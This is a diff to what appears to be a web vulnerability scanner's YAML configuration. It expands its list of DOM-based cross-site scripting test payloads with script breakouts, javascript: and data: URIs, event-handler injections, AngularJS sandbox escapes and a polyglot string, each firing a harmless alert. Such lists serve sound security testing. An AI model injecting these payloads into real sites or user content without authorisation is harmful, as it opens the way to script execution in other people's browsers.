@@ -226,12 +226,30 @@ xss:
 dom_xss:
   payloads:
     - "<script>alert('DOMXSS')</script>"
-    - "javascript:alert('DOMXSS')"
     - "<img src=x onerror=alert('DOMXSS')>"
     - "\"><svg/onload=alert('DOMXSS')>"
     - "#<script>alert('DOMXSS')</script>"
-    - "{{constructor.constructor('alert(\"DOMXSS\")')()}}"
+    - "</script><script>alert('DOMXSS')</script>"
+    - "javascript:alert('DOMXSS')"
+    - "javascript://%250Aalert('DOMXSS')"
+    - "data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NWFNTJyk8L3NjcmlwdD4="
+    - "vbscript:alert('DOMXSS')"
     - "eval(atob('YWxlcnQoJ0RPTVhTUycp'))"
+    - "setTimeout('alert(\"DOMXSS\")', 0)"
+    - "setInterval('alert(\"DOMXSS\")', 0)"
+    - "'-alert('DOMXSS')-'"
+    - "';alert('DOMXSS');//"
+    - "\"-alert('DOMXSS')-\""
+    - "\";alert('DOMXSS');//"
+    - "\\\";alert('DOMXSS');//"
+    - "\" autofocus onfocus=\"alert('DOMXSS')"
+    - "\" onmouseover=\"alert('DOMXSS')"
+    - "' onmouseenter='alert(\"DOMXSS\")"
+    - "{{constructor.constructor('alert(\"DOMXSS\")')()}}"
+    - "{{$on.constructor('alert(\"DOMXSS\")')()}}"
+    - "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(\"DOMXSS\"),a')}}"
+    - "{{$eval.constructor('alert(\"DOMXSS\")')()}}"
+    - 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=''+/"/+/onmouseover=1/+/[*/[]/+alert(''DOMXSS'')//''>'
 
 # XML External Entity Tester
 xxe:
